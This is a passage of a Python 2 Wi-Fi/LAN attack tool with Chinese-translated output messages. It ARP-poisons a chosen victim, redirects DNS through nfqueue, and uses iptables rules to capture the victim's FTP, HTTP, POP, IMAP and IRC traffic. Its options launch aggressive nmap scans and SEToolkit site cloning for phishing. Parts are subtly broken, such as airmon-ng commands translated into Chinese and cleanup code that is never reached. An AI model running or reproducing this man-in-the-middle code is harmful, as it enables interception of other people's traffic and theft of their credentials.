            logger.write('[!] 正在进行重定向...  ' + dns_layer[DNSQR].qname[:-1] + ' to ' + rIP + '\n')



class Queued(object):
    def __init__(self, args):
        self.q = nfqueue.queue()
        self.q.set_callback(Parser(args).start)
        self.q.fast_open(0, socket.AF_INET)
        self.q.set_queue_maxlen(5000)
        reactor.addReader(self)
        self.q.set_mode(nfqueue.NFQNL_COPY_PACKET)
        print '[*] Flushed 防火墙 和转发流量 到队列 ; 等待数据 '

    def fileno(self):
        return self.q.get_fd()

    def doRead(self):
        self.q.process_pending(500)  

    def connectionLost(self, reason):
        reactor.removeReader(self)

    def logPrefix(self):
        return 'queued'


class active_users():
    IPandMAC = []
    start_time = time.time()
    current_time = 0
    monmode = ''

    def pkt_cb(self, pkt):
        if pkt.haslayer(Dot11):
            pkt = pkt[Dot11]
            if pkt.type == 2:
                addresses = [pkt.addr1.upper(), pkt.addr2.upper(), pkt.addr3.upper()]
                for x in addresses:
                    for y in self.IPandMAC:
                        if x in y[1]:
                            y[2] = y[2] + 1
                self.current_time = time.time()
            if self.current_time > self.start_time + 1:
                self.IPandMAC.sort(key=lambda x: float(x[2]), reverse=True)  
                os.system('/usr/bin/clear')
                print '[*] ' + T + 'IP 地址 ' + W + ' 和 ' + R + ' 数据包 ' + W + ' 发送/接收'
                print '---------------------------------------------'
                for x in self.IPandMAC:
                    if len(x) == 3:
                        ip = x[0].ljust(16)
                        data = str(x[2]).ljust(5)
                        print T + ip + W, R + data + W
                    else:
                        ip = x[0].ljust(16)
                        data = str(x[2]).ljust(5)
                        print T + ip + W, R + data + W, x[3]
                print '\n[*] 按下 Ctrl-C 即可停止并且选择目标的 IP 地址 '
                self.start_time = time.time()

    def users(self, IPprefix, routerIP):

        print '[*] 运行 ARP 扫描 , 在网络上识别用户身份 ; 这需要花费几分钟时间 '
        print '      nmap -sn -n %s' % IPprefix
        iplist = []
        maclist = []
        try:
            nmap = Popen(['nmap', '-sn', '-n', IPprefix], stdout=PIPE, stderr=DN)
            nmap = nmap.communicate()[0]
            nmap = nmap.splitlines()[2:-1]
        except Exception:
            print '[-] Nmap ARP ping 失败, 是否 安装 nmap ?'
        for x in nmap:
            if 'Nmap' in x:
                pieces = x.split()
                nmapip = pieces[len(pieces) - 1]
                nmapip = nmapip.replace('(', '').replace(')', '')
                iplist.append(nmapip)
            if 'MAC' in x:
                nmapmac = x.split()[2]
                maclist.append(nmapmac)
        zipped = zip(iplist, maclist)
        self.IPandMAC = [list(item) for item in zipped]

        
        r = 0
        for i in self.IPandMAC:
            i.append(0)
            if r == 0:
                if routerIP == i[0]:
                    i.append('router')
                    routerMAC = i[1]
                    r = 1
        if r == 0:
            exit('[-] Router MAC 没有被找到. 退出中...')

       
        print '[*] 运行 nbtscan , 获取 Windows netbios names'
        print '      nbtscan %s' % IPprefix
        try:
            nbt = Popen(['nbtscan', IPprefix], stdout=PIPE, stderr=DN)
            nbt = nbt.communicate()[0]
            nbt = nbt.splitlines()
            nbt = nbt[4:]
        except Exception:
            print '[-] nbtscan 错误, 请检查是否安装 '
        for l in nbt:
            try:
                l = l.split()
                nbtip = l[0]
                nbtname = l[1]
            except Exception:
                print '[-] 没有发现任何 netbios names. 继续...'
            if nbtip and nbtname:
                for a in self.IPandMAC:
                    if nbtip == a[0]:
                        a.append(nbtname)

        
        try:
            print '[*] 启用监控模式 '
            print '      airmon-ng 查杀'
            os.system('airmon-ng 查杀')
            print '      airmon-ng 开启 ' + interface
            os.system('airmon-ng 开启 ' + interface)
            self.monmode = interface+'mon'
        except Exception:
            exit('[-] 启用监控模式失败...')

        sniff(iface=self.monmode, prn=self.pkt_cb, store=0)



def print_vars(DHCPsrvr, dnsIP, local_domain, routerIP, victimIP):
    print "[*] 存活的接口: " + interface
    print "[*] DHCP 服务器: " + DHCPsrvr
    print "[*] DNS  服务器: " + dnsIP
    print "[*] Local domain: " + local_domain
    print "[*] Router IP: " + routerIP
    print "[*] 目标的 IP: " + victimIP
    logger.write("[*] Router IP: " + routerIP + '\n')
    logger.write("[*] 目标的  IP: " + victimIP + '\n')



def setup(victimMAC):
    os.system('/sbin/iptables -F')
    os.system('/sbin/iptables -X')
    os.system('/sbin/iptables -t nat -F')
    os.system('/sbin/iptables -t nat -X')
    
    os.system(
        '/sbin/iptables -A FORWARD -p tcp -s %s -m multiport --dports 21,26,80,110,143,6667 -j NFQUEUE' % victimIP)
    os.system(
        '/sbin/iptables -A FORWARD -p tcp -d %s -m multiport --dports 21,26,80,110,143,6667 -j NFQUEUE' % victimIP)
    os.system(
        '/sbin/iptables -A FORWARD -p tcp -s %s -m multiport --sports 21,26,80,110,143,6667 -j NFQUEUE' % victimIP)
    os.system(
        '/sbin/iptables -A FORWARD -p tcp -d %s -m multiport --sports 21,26,80,110,143,6667 -j NFQUEUE' % victimIP)
    
    os.system('/sbin/iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
    with open('/proc/sys/net/ipv4/ip_forward', 'r+') as ipf:
        ipf.write('1\n')
        print '[*] 启用IP转发...'
        return ipf.read()



def threads(args):
    rt = Thread(target=reactor.run,
                args=(False,))  
    rt.daemon = True
    rt.start()

    if args.driftnet:
        dr = Thread(target=os.system,
                    args=('/usr/bin/xterm -e /usr/bin/driftnet -i ' + interface + ' >/dev/null 2>&1',))
        dr.daemon = True
        dr.start()

    if args.dnsspoof and not args.setoolkit:
        setoolkit = raw_input(
            '[*] 正在进行 DNS 欺骗 ' + args.dnsspoof + ', 是否开启the Social Engineer\'s Toolkit ? [y/n]: ')
        if setoolkit == 'y':
            print '[*] 开启 SEtoolkit. To clone ' + args.dnsspoof + ' hit options 1, 2, 3, 2, then enter ' + args.dnsspoof
            try:
                se = Thread(target=os.system, args=('/usr/bin/xterm -e /usr/bin/setoolkit >/dev/null 2>&1',))
                se.daemon = True
                se.start()
            except Exception:
                print '[-] 不能够开启 SEToolkit, 请确认是否安装. 继续...'

    if args.nmapaggressive:
        print '[*] 在后台开启 ' + R + '进攻性的扫描 [nmap -e ' + interface + ' -T4 -A -v -Pn -oN ' + victimIP + ']' + W + ' ; 扫描结果将存入 ' + victimIP + '.nmap.txt'
        try:
            n = Thread(target=os.system, args=(
                'nmap -e ' + interface + ' -T4 -A -v -Pn -oN ' + victimIP + '.nmap.txt ' + victimIP + ' >/dev/null 2>&1',))
            n.daemon = True
            n.start()
        except Exception:
            print '[-] A进攻性的 Nmap 扫描失败 , nmap 是否安装 ?'

    if args.setoolkit:
        print '[*] 开启 SEtoolkit'
        try:
            se = Thread(target=os.system, args=('/usr/bin/xterm -e /usr/bin/setoolkit >/dev/null 2>&1',))
            se.daemon = True
            se.start()
        except Exception:
            print '[-] 不能开启 SEToolkit,继续...'


def pcap_handler(args):
    global victimIP
    bad_args = [args.dnsspoof, args.beef, args.code, args.nmap, args.nmapaggressive, args.driftnet, args.interface]
    for x in bad_args:
        if x:
            exit(
                '[-] 从PCAP文件中读取数据时，需要包括以下参数 -v, -u, -p, -pcap [pcap filename], 和 -ip [目标 IP address]')
    if args.pcap:
        if args.ipaddress:
            victimIP = args.ipaddress
            pcap = rdpcap(args.pcap)
            for payload in pcap:
                Parser(args).start(payload)
            exit('[-] 完成分析 pcap 文件')
        else:
            exit('[-] 从PCAP文件中读取时，请包括下列实际参数: -ip [target\'s IP address]')
    else:
        exit(
            '[-] 当从PCAP文件中读取数据，请包括以下参数: -v, -u, -p, -pcap [pcap filename], 和 -ip [目标 IP address]')

    
    def signal_handler(signal, frame):
        print '学习IP表, 发送 healing packets, 关闭IP转发...'
        logger.close()
        with open('/proc/sys/net/ipv4/ip_forward', 'r+') as forward:
            forward.write(ipf)
        Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
        Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
        os.system('/sbin/iptables -F')
        os.system('/sbin/iptables -X')
        os.system('/sbin/iptables -t nat -F')
        os.system('/sbin/iptables -t nat -X')
        exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    while 1:
        Spoof().poison(routerIP, victimIP, routerMAC, victimMAC)
        time.sleep(1.5)


if __name__ == "__main__":
    if not os.geteuid() == 0:
        exit("\n请用root权限运行 \n")
    logger = open('WifiAttackpy.log.txt', 'w+')
    DN = open(os.devnull, 'w')
    args = parse_args()
    if args.pcap:
        pcap_handler(args)
        exit('[-] 完成分析 pcap 文件 ')
    else:
        WifiAttackMain(args)
